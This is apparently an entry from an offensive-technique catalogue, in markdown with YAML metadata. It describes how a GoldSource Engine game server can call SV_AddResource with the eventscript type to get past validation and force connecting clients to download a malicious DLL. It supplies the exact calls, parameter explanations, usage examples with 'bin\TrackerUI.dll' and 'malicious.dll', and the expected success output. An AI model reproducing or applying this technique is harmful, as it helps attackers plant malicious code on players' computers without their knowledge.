---
data: >-
  SV_AddResource (t_eventscript, filename, FS_FileSize (filename),
  RES_FATALIFMISSING, 0);
tags:
  - resource-add
  - bypass
type: command
output: null
executor: c++
platforms:
  - Windows
  - Game Engine
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T05:32:10.351Z'
id: 5486910d-90fc-435a-9323-87dd7f3484ad
verified: false
validated: true
submitted: true
---
# SV_AddResource-Queue-Malicious-File

## Command

```c++
SV_AddResource (t_eventscript, filename, FS_FileSize (filename), RES_FATALIFMISSING, 0);
```

## Description

This C++ function call adds a resource to the GoldSource Engine server's download list, using eventscript type to bypass validation and queue a malicious DLL for client HTTP download.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| t_eventscript | Resource type (bypasses full safety checks) | Yes |
| filename | Path to malicious file, e.g., bin\\TrackerUI.dll | Yes |
| FS_FileSize (filename) | Computed size of the file for transfer | Yes |
| RES_FATALIFMISSING | Flag making the resource required (forces download) | Yes |
| 0 | Compression flag (none applied) | Yes |

## Examples

### Basic Usage

```c++
SV_AddResource (t_eventscript, "bin\\TrackerUI.dll", FS_FileSize ("bin\\TrackerUI.dll"), RES_FATALIFMISSING, 0);
```

### Advanced Usage

```c++
// In SV_CreateResourceList context
char* filename = "bin\\malicious.dll";
int size = FS_FileSize(filename);
SV_AddResource (t_eventscript, filename, size, RES_FATALIFMISSING, 0);
```

## Expected Output

Resource successfully added to the server's list; no errors returned, and it appears in client batch requests upon connection.

## Related

- [[procedures/Queue-Malicious-Resource-on-Server]]
